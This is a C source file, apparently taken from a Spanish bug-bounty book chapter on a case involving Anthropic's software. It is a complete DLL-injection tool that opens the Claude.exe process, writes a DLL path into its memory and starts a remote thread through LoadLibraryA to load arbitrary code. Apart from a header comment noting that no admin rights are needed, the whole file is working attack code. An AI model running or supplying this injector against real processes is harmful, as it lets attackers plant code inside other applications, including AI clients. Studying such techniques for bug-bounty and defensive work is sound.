// Extraído de: LibroBugBounty/cap-23-caso-anthropic.md
/**
 * injector.c -- Inyecta DLL en proceso Claude.exe
 * No requiere admin. El usuario puede inyectar en sus
 * propios procesos.
 */
#include <windows.h>

int main(int argc, char *argv[]) {
    DWORD pid = atoi(argv[1]);
    char *dll = argv[2];

    HANDLE hProc = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, pid);

    LPVOID mem = VirtualAllocEx(hProc, NULL,
        strlen(dll) + 1, MEM_COMMIT, PAGE_READWRITE);

    WriteProcessMemory(hProc, mem, dll,
        strlen(dll) + 1, NULL);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(
            GetModuleHandleA("kernel32.dll"),
            "LoadLibraryA"),
        mem, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
